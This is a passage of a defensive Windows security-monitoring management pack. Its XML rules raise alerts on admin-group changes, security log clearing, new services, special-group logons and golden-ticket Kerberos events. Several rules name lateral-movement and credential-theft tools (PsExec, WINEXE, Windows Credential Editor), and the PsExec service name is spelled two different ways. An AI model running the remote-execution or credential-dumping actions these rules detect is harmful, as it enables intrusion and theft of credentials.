            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[3]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Schema Admins</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4756</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4757</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Accounts.SchemaAdminChange.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Accounts.EnterpriseAdminChange" Enabled="true" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[3]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Enterprise Admins</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4756</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4757</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Accounts.EnterpriseAdminChange.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.SecurityLogCleared" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">1102</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Microsoft-Windows-Eventlog</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.SecurityLogCleared.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.ServiceCreatedonMemberServer" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>System</LogName>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">7045</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.ServiceCreatedonMemberServer.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">4964</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.LocalAccountCreatedonServer" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">4720</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.LocalAccountCreatedonServer.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.ServiceKnownThreat" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>System</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">7045</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>PSEXESVC</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>WCESERVICE</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>WINEXE</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.ServiceKnownThreat.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.EventCollection.SpecialGroupLogon" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">4964</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="WriteToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="WriteToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.EventCollection.BatchLogon" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4624</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">4</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="WriteToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="WriteToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ThreatHunt.BatchLogonInUse" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4624</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">4</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ThreatHunt.BatchLogonInUse.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Threat Hunting</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.EventCollection.GoldenTicket" Enabled="false" Target="Windows!Microsoft.Windows.Server.DC.Computer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4769</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>0x1F</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="WriteToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="WriteToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">1102</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">Microsoft-Windows-Eventlog</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.EventCollection.4672" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>EventCollection</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventCollector">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <AllowProxying>false</AllowProxying>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">4672</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="WriteToDB" TypeID="SystemCenter!Microsoft.SystemCenter.CollectEvent" />
          <WriteAction ID="WriteToDW" TypeID="SCDW!Microsoft.SystemCenter.DataWarehouse.PublishEventData" />
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">4964</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.ServiceCreation" Enabled="false" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">7045</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.ServiceCreation.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">7045</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>PSEXECSVC</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>WINEXE</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">EventDescription</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>WCESERVICE</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
              <AlertParameter2>$Data/LoggingComputer$</AlertParameter2>
              <AlertParameter3>$Data/UserName$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.CredentialSwap" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
